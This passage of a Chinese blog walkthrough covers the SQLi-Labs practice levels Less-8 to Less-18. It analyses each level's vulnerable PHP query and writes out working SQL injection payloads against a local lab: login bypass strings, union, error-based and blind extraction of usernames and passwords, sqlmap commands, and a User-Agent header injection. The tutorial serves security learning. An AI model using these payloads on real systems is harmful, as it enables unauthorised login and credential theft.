align="left">请求方式</th><th align="left">注入类型</th><th align="left">拼接方式</th></tr></thead><tbody><tr><td align="left">GET</td><td align="left">布尔盲注、延时盲注</td><td align="left"><code>id=&#39;$id&#39;</code></td></tr></tbody></table><p>和 Less-7 注入方式一致，只是拼接方式不一样，这里 就不再啰嗦了。</p><h2 id="Less-9"><a href="#Less-9" class="headerlink" title="Less-9"></a>Less-9</h2><table><thead><tr><th align="left">请求方式</th><th align="left">注入类型</th><th align="left">拼接方式</th></tr></thead><tbody><tr><td align="left">GET</td><td align="left">延时盲注</td><td align="left"><code>id=&#39;$id&#39;</code></td></tr></tbody></table><p>和 Less-7 注入方式一致，只是拼接方式不一样，这里 就不再啰嗦了。</p><p><strong>源码简单分析</strong>：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment"># 使用单引号拼接</span><span class="token variable">$sql</span><span class="token operator">=</span><span class="token string double-quoted-string">"SELECT * FROM users WHERE id='<span class="token interpolation"><span class="token variable">$id</span></span>' LIMIT 0,1"</span><span class="token punctuation">;</span><span class="token comment"># 支持延时盲注</span><span class="token keyword">if</span> <span class="token constant boolean">true</span><span class="token punctuation">:</span>    输出 You are in<span class="token operator">...</span><span class="token operator">...</span><span class="token operator">...</span><span class="token operator">...</span><span class="token keyword">else</span><span class="token punctuation">:</span>    输出 You are in<span class="token operator">...</span><span class="token operator">...</span><span class="token operator">...</span><span class="token operator">.</span><span class="token operator">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>从源码中可以看到 if else 都输出的是 You are in……….. 这样就不能通过布尔盲注来进行注入了，只能用最慢的延时注入。延时注入细节可以参考 Less-1 的注入细节。</p><h2 id="Less-10"><a href="#Less-10" class="headerlink" title="Less-10"></a>Less-10</h2><table><thead><tr><th align="left">请求方式</th><th align="left">注入类型</th><th align="left">拼接方式</th></tr></thead><tbody><tr><td align="left">GET</td><td align="left">延时盲注</td><td align="left"><code>id=&quot;$id&quot;</code></td></tr></tbody></table><p><strong>源码简单分析</strong>：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment"># 先使用双引号再直接拼接</span><span class="token variable">$id</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'"'</span><span class="token operator">.</span><span class="token variable">$id</span><span class="token operator">.</span><span class="token string single-quoted-string">'"'</span><span class="token punctuation">;</span><span class="token variable">$sql</span><span class="token operator">=</span><span class="token string double-quoted-string">"SELECT * FROM users WHERE id=<span class="token interpolation"><span class="token variable">$id</span></span> LIMIT 0,1"</span><span class="token punctuation">;</span><span class="token comment"># 支持延时盲注</span><span class="token keyword">if</span> <span class="token constant boolean">true</span><span class="token punctuation">:</span>    输出 You are in<span class="token operator">...</span><span class="token operator">...</span><span class="token operator">...</span><span class="token operator">...</span><span class="token keyword">else</span><span class="token punctuation">:</span>    输出 You are in<span class="token operator">...</span><span class="token operator">...</span><span class="token operator">...</span><span class="token operator">.</span><span class="token operator">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>和 Less-9 利用方式一样，只是拼接方式不一样，具体可以参考 Less-9</p><h2 id="Less-11"><a href="#Less-11" class="headerlink" title="Less-11"></a>Less-11</h2><table><thead><tr><th align="left">请求方式</th><th align="left">注入类型</th><th align="left">拼接方式</th></tr></thead><tbody><tr><td align="left">POST</td><td align="left">联合、报错、布尔盲注、延时盲注</td><td align="left"><code>username=&#39;x&#39;</code></td></tr></tbody></table><p><strong>源码简单分析</strong>：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment"># POST 方式接受变量</span><span class="token variable">$uname</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'uname'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$passwd</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'passwd'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment"># 使用单引号拼接 SQL</span>@<span class="token variable">$sql</span><span class="token operator">=</span><span class="token string double-quoted-string">"SELECT username, password FROM users WHERE username='<span class="token interpolation"><span class="token variable">$uname</span></span>' and password='<span class="token interpolation"><span class="token variable">$passwd</span></span>' LIMIT 0,1"</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token constant boolean">true</span><span class="token punctuation">:</span>    输出查询的信息<span class="token keyword">else</span><span class="token punctuation">:</span>    <span class="token function">print_r</span><span class="token punctuation">(</span><span class="token function">mysql_error</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>和 Less-1 的利用方式相同，只是由 GET 型变成 POST 型。</p><h3 id="万能密码"><a href="#万能密码" class="headerlink" title="万能密码"></a>万能密码</h3><p>这里拿 admin 用户来模拟登录测试，首先查询出 admin 的用户信息如下：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">mysql<span class="token operator">></span> <span class="token keyword">select</span> * from <span class="token function">users</span> where username <span class="token operator">=</span> <span class="token string">'admin'</span><span class="token punctuation">;</span>+----+----------+----------+<span class="token operator">|</span> <span class="token function">id</span> <span class="token operator">|</span> username <span class="token operator">|</span> password <span class="token operator">|</span>+----+----------+----------+<span class="token operator">|</span>  <span class="token number">8</span> <span class="token operator">|</span> admin    <span class="token operator">|</span> admin    <span class="token operator">|</span>+----+----------+----------+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>因为核心的 SQL 语句只使用单引号拼接，这里就是一个经典的万能密码漏洞，可以使用如下 Payload 来登录系统：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 注释掉 passwd 来登录</span><span class="token assign-left variable">uname</span><span class="token operator">=</span>admin<span class="token string">'--+&amp;passwd=&amp;submit=Submituname=admin'</span><span class="token comment">#&amp;passwd=&amp;submit=Submit</span><span class="token comment"># 注释后面语句 并 添加一个永真条件</span><span class="token assign-left variable">uname</span><span class="token operator">=</span>admin<span class="token operator">&amp;</span><span class="token assign-left variable">passwd</span><span class="token operator">=</span><span class="token number">1</span><span class="token string">' or 1--+&amp;submit=Submituname=admin&amp;passwd=1'</span><span class="token operator">||</span><span class="token number">1</span>--+<span class="token operator">&amp;</span><span class="token assign-left variable">submit</span><span class="token operator">=</span>Submit<span class="token assign-left variable">uname</span><span class="token operator">=</span>admin<span class="token operator">&amp;</span><span class="token assign-left variable">passwd</span><span class="token operator">=</span><span class="token number">1</span><span class="token string">' or 1#&amp;submit=Submituname=admin&amp;passwd=1'</span><span class="token operator">||</span><span class="token number">1</span><span class="token comment">#&amp;submit=Submit</span><span class="token comment"># 闭合后面语句 并 添加一个永真条件</span><span class="token assign-left variable">uname</span><span class="token operator">=</span>admin<span class="token operator">&amp;</span><span class="token assign-left variable">passwd</span><span class="token operator">=</span><span class="token number">1</span><span class="token string">'or'</span><span class="token number">1</span><span class="token string">'='</span><span class="token number">1</span><span class="token operator">&amp;</span><span class="token assign-left variable">submit</span><span class="token operator">=</span>Submit<span class="token assign-left variable">uname</span><span class="token operator">=</span>admin<span class="token operator">&amp;</span><span class="token assign-left variable">passwd</span><span class="token operator">=</span><span class="token number">1</span><span class="token string">'||'</span><span class="token number">1</span><span class="token string">'='</span><span class="token number">1</span><span class="token operator">&amp;</span><span class="token assign-left variable">submit</span><span class="token operator">=</span>Submit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>因为这是一个 POST 型的注入，那么 这里就再啰嗦一遍，走一遍详细的流程吧</p><h3 id="联合查询注入-1"><a href="#联合查询注入-1" class="headerlink" title="联合查询注入"></a>联合查询注入</h3><blockquote><p>POST 数据里面不能有 <code>+</code>，这里得手动转换为空格</p></blockquote><pre class="line-numbers language-payload" data-language="payload"><code class="language-payload">uname&#x3D;admin&amp;passwd&#x3D;1&#39;union select 1,(SELECT GROUP_CONCAT(username,password) FROM users)#&amp;submit&#x3D;Submit<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="报错注入1-1"><a href="#报错注入1-1" class="headerlink" title="报错注入1"></a>报错注入1</h3><p>手动修改 <code>LIMIT+0,1</code> 来进行结果偏移</p><pre class="line-numbers language-paylaod" data-language="paylaod"><code class="language-paylaod">uname&#x3D;admin&amp;passwd&#x3D;1&#39;AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT(SELECT CONCAT(CAST(CONCAT(username,password) AS CHAR),0x7e)) FROM users LIMIT 0,1),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a)#&amp;submit&#x3D;Submit<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="报错注入2-1"><a href="#报错注入2-1" class="headerlink" title="报错注入2"></a>报错注入2</h3><p>手动修改 <code>LIMIT+0,1</code> 来进行结果偏移</p><pre class="line-numbers language-paylaod" data-language="paylaod"><code class="language-paylaod">uname&#x3D;admin&amp;passwd&#x3D;1&#39; AND (SELECT 1 FROM(SELECT count(*),CONCAT((SELECT (SELECT (SELECT CONCAT(0x7e,0x27,cast(username AS CHAR),0x27,0x7e) FROM users LIMIT 0,1)) FROM INFORMATION_SCHEMA.TABLES LIMIT 0,1),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a) AND 1&#x3D;1#&amp;submit&#x3D;Submit<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="布尔盲注-1"><a href="#布尔盲注-1" class="headerlink" title="布尔盲注"></a>布尔盲注</h3><p>数据库第一个字母为 <code>s</code></p><pre class="line-numbers language-payload" data-language="payload"><code class="language-payload">uname&#x3D;admin&#39; and left(database(),1)&gt;&#39;r&#39;#&amp;passwd&#x3D;&amp;submit&#x3D;Submituname&#x3D;admin&#39; and left(database(),1)&gt;&#39;s&#39;#&amp;passwd&#x3D;&amp;submit&#x3D;Submit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="延时盲注-1"><a href="#延时盲注-1" class="headerlink" title="延时盲注"></a>延时盲注</h3><p>数据库第一个字母的 ascii 码为 115，即<code>s</code></p><pre class="line-numbers language-payload" data-language="payload"><code class="language-payload">uname&#x3D;admin&#39; and if(ascii(substr(database(),1,1))&gt;114,1,sleep(5))#&amp;passwd&#x3D;&amp;submit&#x3D;Submituname&#x3D;admin&#39; and if(ascii(substr(database(),1,1))&gt;115,1,sleep(5))#&amp;passwd&#x3D;&amp;submit&#x3D;Submit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="sqlmap-1"><a href="#sqlmap-1" class="headerlink" title="sqlmap"></a>sqlmap</h3><p><strong>加载目标</strong></p><p>可以直接将 Burpsuite 截取的数据包内容保持为文本格式 <code>test.txt</code>：</p><pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token request-line"><span class="token method property">POST</span> <span class="token request-target url">/Less-11/</span> <span class="token http-version property">HTTP/1.1</span></span><span class="token header"><span class="token header-name keyword">Host</span><span class="token punctuation">:</span> <span class="token header-value">127.0.0.1:8888</span></span><span class="token header"><span class="token header-name keyword">User-Agent</span><span class="token punctuation">:</span> <span class="token header-value">Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:56.0) Gecko/20100101 Firefox/56.0</span></span><span class="token header"><span class="token header-name keyword">Accept</span><span class="token punctuation">:</span> <span class="token header-value">text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span></span><span class="token header"><span class="token header-name keyword">Accept-Language</span><span class="token punctuation">:</span> <span class="token header-value">zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</span></span><span class="token header"><span class="token header-name keyword">Accept-Encoding</span><span class="token punctuation">:</span> <span class="token header-value">gzip, deflate</span></span><span class="token header"><span class="token header-name keyword">Referer</span><span class="token punctuation">:</span> <span class="token header-value">http://127.0.0.1:8888/Less-11/</span></span><span class="token header"><span class="token header-name keyword">Content-Type</span><span class="token punctuation">:</span> <span class="token header-value">application/x-www-form-urlencoded</span></span><span class="token header"><span class="token header-name keyword">Content-Length</span><span class="token punctuation">:</span> <span class="token header-value">38</span></span><span class="token header"><span class="token header-name keyword">Connection</span><span class="token punctuation">:</span> <span class="token header-value">close</span></span><span class="token header"><span class="token header-name keyword">Upgrade-Insecure-Requests</span><span class="token punctuation">:</span> <span class="token header-value">1</span></span>uname=admin&amp;passwd=2333&amp;submit=Submit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然后直接使用 sqlmap 的 -r 参数来加载这个请求包：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">sqlmap -r test.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>也可以手动通过 <code>--data</code> 来对 POST 的数据包内容进行注入检测：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">sqlmap -u <span class="token string">"http://127.0.0.1:8888/Less-11/"</span> --data<span class="token operator">=</span><span class="token string">"uname=admin&amp;passwd=2333&amp;submit=Submit"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>实际上 <code>--data</code> 比较鸡肋，操作效率比较低，因为比较冷门，所有适合来炫耀自己会这个参数，这样对 sqlmap 不够了解的人 就会觉得很高大上。所以接下来我都使用 <code>--data</code> 这个参数来进行注入 🤓</p><p><strong>联合查询注入</strong></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">sqlmap -u <span class="token string">"http://127.0.0.1:8888/Less-11/"</span> --data<span class="token operator">=</span><span class="token string">"uname=admin&amp;passwd=2333&amp;submit=Submit"</span> -p <span class="token string">"uname"</span> --dbms<span class="token operator">=</span>MySQL --random-agent --flush-session --technique<span class="token operator">=</span>U -v <span class="token number">3</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>报错注入</strong></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">sqlmap -u <span class="token string">"http://127.0.0.1:8888/Less-11/"</span> --data<span class="token operator">=</span><span class="token string">"uname=admin&amp;passwd=2333&amp;submit=Submit"</span> -p <span class="token string">"uname"</span> --dbms<span class="token operator">=</span>MySQL --random-agent --flush-session --technique<span class="token operator">=</span>B -v <span class="token number">3</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>布尔盲注</strong></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">sqlmap -u <span class="token string">"http://127.0.0.1:8888/Less-11/"</span> --data<span class="token operator">=</span><span class="token string">"uname=admin&amp;passwd=2333&amp;submit=Submit"</span> -p <span class="token string">"uname"</span> --dbms<span class="token operator">=</span>MySQL --random-agent --flush-session --technique<span class="token operator">=</span>B -v <span class="token number">3</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>延时盲注</strong></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">sqlmap -u <span class="token string">"http://127.0.0.1:8888/Less-11/"</span> --data<span class="token operator">=</span><span class="token string">"uname=admin&amp;passwd=2333&amp;submit=Submit"</span> -p <span class="token string">"uname"</span> --dbms<span class="token operator">=</span>MySQL --random-agent --flush-session --technique<span class="token operator">=</span>T -v <span class="token number">3</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="Less-12"><a href="#Less-12" class="headerlink" title="Less-12"></a>Less-12</h2><table><thead><tr><th align="left">请求方式</th><th align="left">注入类型</th><th align="left">拼接方式</th></tr></thead><tbody><tr><td align="left">POST</td><td align="left">联合、报错、布尔盲注、延时盲注</td><td align="left"><code>username=(&quot;x&quot;)</code></td></tr></tbody></table><p>和 Less-11 的利用方式一样，只是 SQL 拼接方式不同，这里就不再啰嗦了。</p><h2 id="Less-13"><a href="#Less-13" class="headerlink" title="Less-13"></a>Less-13</h2><table><thead><tr><th align="left">请求方式</th><th align="left">注入类型</th><th align="left">拼接方式</th></tr></thead><tbody><tr><td align="left">POST</td><td align="left">报错、布尔盲注、延时盲注</td><td align="left"><code>username=(&#39;x&#39;)</code></td></tr></tbody></table><p>**简单源码分析</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment"># POST 方式接受变量</span><span class="token variable">$uname</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'uname'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$passwd</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'passwd'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment"># 使用单引号和括号来拼接 SQL</span>@<span class="token variable">$sql</span><span class="token operator">=</span><span class="token string double-quoted-string">"SELECT username, password FROM users WHERE username=('<span class="token interpolation"><span class="token variable">$uname</span></span>') and password=('<span class="token interpolation"><span class="token variable">$passwd</span></span>') LIMIT 0,1"</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token constant boolean">true</span><span class="token punctuation">:</span>    并没有输出啥信息<span class="token keyword">else</span><span class="token punctuation">:</span>    <span class="token function">print_r</span><span class="token punctuation">(</span><span class="token function">mysql_error</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>因为没有输出查询后的信息的原因，所以相对于 Less-11 和 Less-12 来说就少了 联合查询的注入方式，其他还是换汤不换药，这里就不再赘述了。</p><h2 id="Less-14"><a href="#Less-14" class="headerlink" title="Less-14"></a>Less-14</h2><table><thead><tr><th align="left">请求方式</th><th align="left">注入类型</th><th align="left">拼接方式</th></tr></thead><tbody><tr><td align="left">POST</td><td align="left">报错、布尔盲注、延时盲注</td><td align="left"><code>username=&quot;x&quot;</code></td></tr></tbody></table><p>**简单源码分析</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment"># 先使用 双引号 再直接带入 SQL 语句</span><span class="token variable">$uname</span><span class="token operator">=</span><span class="token string single-quoted-string">'"'</span><span class="token operator">.</span><span class="token variable">$uname</span><span class="token operator">.</span><span class="token string single-quoted-string">'"'</span><span class="token punctuation">;</span><span class="token variable">$passwd</span><span class="token operator">=</span><span class="token string single-quoted-string">'"'</span><span class="token operator">.</span><span class="token variable">$passwd</span><span class="token operator">.</span><span class="token string single-quoted-string">'"'</span><span class="token punctuation">;</span> @<span class="token variable">$sql</span><span class="token operator">=</span><span class="token string double-quoted-string">"SELECT username, password FROM users WHERE username=<span class="token interpolation"><span class="token variable">$uname</span></span> and password=<span class="token interpolation"><span class="token variable">$passwd</span></span> LIMIT 0,1"</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>和 Less-13 异曲同工，只是拼接方式不一样，我们换对应的闭合方式即可进行注入。</p><h2 id="Less-15"><a href="#Less-15" class="headerlink" title="Less-15"></a>Less-15</h2><table><thead><tr><th align="left">请求方式</th><th align="left">注入类型</th><th align="left">拼接方式</th></tr></thead><tbody><tr><td align="left">POST</td><td align="left">布尔盲注、延时盲注</td><td align="left"><code>username=&#39;x&#39;</code></td></tr></tbody></table><p>源码中注释掉了 MySQL 的报错日志，所以这里就不可以进行报错注入了，只能使用布尔盲注或者延时盲注。</p><p> 这里不再做重复无意义的记录了。</p><h2 id="Less-16"><a href="#Less-16" class="headerlink" title="Less-16"></a>Less-16</h2><table><thead><tr><th align="left">请求方式</th><th align="left">注入类型</th><th align="left">拼接方式</th></tr></thead><tbody><tr><td align="left">POST</td><td align="left">布尔盲注、延时盲注</td><td align="left"><code>username=(&quot;x&quot;)</code></td></tr></tbody></table><p>和 Less-15 注入类型一致，更换对应的闭合方式即可。</p><h2 id="Less-17"><a href="#Less-17" class="headerlink" title="Less-17"></a>Less-17</h2><table><thead><tr><th align="left">请求方式</th><th align="left">注入类型</th><th align="left">拼接方式</th></tr></thead><tbody><tr><td align="left">POST</td><td align="left">报错、布尔盲注、延时盲注</td><td align="left"><code>password = &#39;$passwd&#39;</code></td></tr></tbody></table><p><strong>简单源码分析</strong>:</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment"># uname 参数被过滤了</span><span class="token variable">$uname</span><span class="token operator">=</span><span class="token function">check_input</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'uname'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token variable">$passwd</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'passwd'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment"># SELECT 语句只获取了 uname 参数 但是被过滤了 没戏</span>@<span class="token variable">$sql</span><span class="token operator">=</span><span class="token string double-quoted-string">"SELECT username, password FROM users WHERE username= <span class="token interpolation"><span class="token variable">$uname</span></span> LIMIT 0,1"</span><span class="token punctuation">;</span><span class="token keyword">if</span> select 结果正确<span class="token punctuation">:</span>    <span class="token comment"># 更新语句 使用单引号拼接 passwd</span>    <span class="token variable">$update</span><span class="token operator">=</span><span class="token string double-quoted-string">"UPDATE users SET password = '<span class="token interpolation"><span class="token variable">$passwd</span></span>' WHERE username='<span class="token interpolation"><span class="token variable">$row1</span></span>'"</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> mysql 报错<span class="token punctuation">:</span>            <span class="token function">print_r</span><span class="token punctuation">(</span><span class="token function">mysql_error</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>从源码中可以分享唯一的注入点是在 update 语句里面，只使用了单引号拼接。因为操作正确并没有啥提示，所以不能使用联合查询注入，因为输出了报错日志，所以还可以进行报错注入，那么下面就演示一下报错注入吧：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token assign-left variable">uname</span><span class="token operator">=</span>admin<span class="token operator">&amp;</span><span class="token assign-left variable">passwd</span><span class="token operator">=</span><span class="token number">1</span>' AND <span class="token punctuation">(</span>SELECT <span class="token number">1</span> FROM <span class="token punctuation">(</span>SELECT COUNT<span class="token punctuation">(</span>*<span class="token punctuation">)</span>,CONCAT<span class="token variable"><span class="token punctuation">((</span>SELECT<span class="token punctuation">(</span>SELECT CONCAT<span class="token punctuation">(</span>CAST<span class="token punctuation">(</span>CONCAT<span class="token punctuation">(</span>username<span class="token punctuation">,</span>password<span class="token punctuation">)</span> AS CHAR<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x7e</span><span class="token punctuation">))</span></span> FROM <span class="token function">users</span> LIMIT <span class="token number">0,1</span><span class="token punctuation">)</span>,FLOOR<span class="token punctuation">(</span>RAND<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>*2<span class="token punctuation">))</span>x FROM INFORMATION_SCHEMA.TABLES GROUP BY x<span class="token punctuation">)</span>a<span class="token punctuation">)</span><span class="token comment">#&amp;submit=Submit</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="Less-18"><a href="#Less-18" class="headerlink" title="Less-18"></a>Less-18</h2><table><thead><tr><th align="left">请求方式</th><th align="left">注入类型</th><th align="left">拼接方式</th></tr></thead><tbody><tr><td align="left">POST</td><td align="left">报错、布尔盲注、延时盲注</td><td align="left"><code>VALUES (&#39;$uagent&#39;)</code></td></tr></tbody></table><p><strong>简单源码分析</strong>:</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment"># 获取请求的 uagent 和 ip 地址</span><span class="token variable">$uagent</span> <span class="token operator">=</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'HTTP_USER_AGENT'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$IP</span> <span class="token operator">=</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'REMOTE_ADDR'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span> 输入了uname 和 passwd<span class="token punctuation">:</span>    <span class="token comment"># 对这两个参数进行过滤</span>    <span class="token variable">$uname</span> <span class="token operator">=</span> <span class="token function">check_input</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'uname'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$passwd</span> <span class="token operator">=</span> <span class="token function">check_input</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'passwd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$sql</span><span class="token operator">=</span><span class="token string double-quoted-string">"SELECT  users.username, users.password FROM users WHERE users.username=<span class="token interpolation"><span class="token variable">$uname</span></span> and users.password=<span class="token interpolation"><span class="token variable">$passwd</span></span> ORDER BY users.id DESC LIMIT 0,1"</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token constant">SQL</span>语句有返回结果<span class="token punctuation">:</span>        <span class="token comment"># 执行 insert 语句 这里 uagent 和 ip_address 通过单引号拼接 并且 没有过滤</span>        <span class="token variable">$insert</span><span class="token operator">=</span><span class="token string double-quoted-string">"INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES ('<span class="token interpolation"><span class="token variable">$uagent</span></span>', '<span class="token interpolation"><span class="token variable">$IP</span></span>', <span class="token interpolation"><span class="token variable">$uname</span></span>)"</span><span class="token punctuation">;</span>            输出 <span class="token variable">$uagent</span><span class="token punctuation">;</span>        <span class="token function">print_r</span><span class="token punctuation">(</span><span class="token function">mysql_error</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token function">print_r</span><span class="token punctuation">(</span><span class="token function">mysql_error</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这个代码漏洞点出在了 insert 语句，这里没有对 uagent 和 ip_address 进行过滤，并且输出了 mysql 的报错信息，所以本关支持 报错注入、布尔盲注和延时盲注。</p><p><strong>PHP 里用来获取客户端 IP 的变量</strong></p><ul><li><code>$_SERVER[&#39;HTTP_CLIENT_IP&#39;]</code> 这个很少使用，不一定服务器都实现了。客户端可以伪造。</li><li><code>$_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;]</code>，客户端可以伪造。</li><li><code>$_SERVER[&#39;REMOTE_ADDR&#39;]</code>，客户端不能伪造。</li></ul><p>所以这里的 IP 是无法被伪造的，这里只能通过修改 user-agent 来进行注入，考虑到 insert 语句的特殊性，这里使用闭合方式来闭合掉后面的语句，因为输出了 mysql 报错日志了，这里尝试报错注入效率会更高一点：</p><pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token request-line"><span class="token method property">POST</span> <span class="token request-target url">/Less-18/</span> <span class="token http-version property">HTTP/1.1</span></span><span class="token header"><span class="token header-name keyword">Host</span><span class="token punctuation">:</span> <span class="token header-value">127.0.0.1:8888</span></span><span class="token header"><span class="token header-name keyword">User-Agent</span><span class="token punctuation">:</span> <span class="token header-value">1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT(SELECT CONCAT(CAST(CONCAT(username,password) AS CHAR),0x7e)) FROM users LIMIT 0,1),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a) and '1'='1</span></span><span class="token header"><span class="token header-name keyword">Accept</span><span class="token punctuation">:</span> <span class="token header-value">text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span></span><span class="token header"><span class="token header-name keyword">Accept-Language</span><span class="token punctuation">:</span> <span class="token header-value">zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</span></span><span class="token header"><span class="token header-name keyword">Accept-Encoding</span><span class="token punctuation">:</span> <span class="token header-value">gzip, deflate</span></span><span class="token header"><span class="token header-name keyword">Referer</span><span class="token punctuation">:</span> <span class="token header-value">http://127.0.0.1:8888/Less-18/</span></span><span class="token header"><span class="token header-name keyword">Content-Type</span><span class="token punctuation">:</span> <span class="token header-value">application/x-www-form-urlencoded</span></span><span class="token header"><span class="token header-name keyword">Content-Length</span><span class="token punctuation">:</span> <span class="token header-value">38</span></span><span class="token header"><span class="token header-name keyword">Connection</span><span class="token punctuation">:</span> <span class="token header-value">close</span></span><span class="token header"><span class="token header-name keyword">Upgrade-Insecure-Requests</span><span class="token punctuation">:</span> <span class="token header-value">1</span></span>uname=admin&amp;passwd=admin&amp;submit=Submit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://image.3001.net/images/20200513/15893833852620.png" alt="img"></p><h2 